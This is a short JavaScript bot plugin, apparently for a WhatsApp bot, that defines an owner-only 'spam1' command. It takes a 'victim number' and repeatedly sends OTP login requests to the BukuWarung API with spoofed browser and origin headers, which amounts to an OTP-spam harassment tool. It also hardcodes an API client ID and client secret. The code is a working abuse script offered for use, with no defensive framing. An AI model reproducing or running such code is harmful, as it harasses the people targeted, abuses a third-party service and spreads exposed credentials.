import fetch from 'node-fetch'
let handler = async (m, { conn, text, usedPrefix }) => {
  let [number, pesan, jumlah] = text.split('|')
  if ((!number)) throw `Masukkan nomor korban`

const nomor = number; // Ganti dengan nomor telepon yang sesuai

const data = JSON.stringify({
  action: "LOGIN_OTP",
  countryCode: "+62",
  deviceId: "test-1",
  method: "Telegram",
  phone: nomor,
  clientId: "2e3570c6-317e-4524-b284-980e5a4335b6",
  clientSecret: "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
});

  const sendRequest = () => {
    fetch("https://api-v2.bukuwarung.com/api/v2/auth/otp/send", {
      method: "POST",
      headers: {
    "Host": "api-v2.bukuwarung.com",
    "content-length": data.length.toString(),
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    "content-type": "application/json",
    "x-app-version-name": "android",
    "accept": "application/json, text/plain, */*",
    "x-app-version-code": "3001",
    "buku-origin": "tokoko-web",
    "sec-ch-ua-platform": "Android",
    "origin": "https://tokoko.id",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://tokoko.id",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
  },
            body: data
          })
            .then(response => response.text())
            .then(data => {
              console.log(data); // Handle data response here
            })
            .catch(error => {
              console.error(error); // Handle any errors here
            });
        };

        // Loop 3 kali dengan jeda satu menit antara setiap permintaan
        let i = 0;
        const loop = () => {
          if (i < 3) {
            sendRequest();
            i++;
            setTimeout(loop, 60000); // Jeda satu menit (60000 milidetik)
          }
        };
        loop();
      }

handler.tags = ['tools']
handler.command = /^(spam1)$/i
handler.owner = true
export default handler
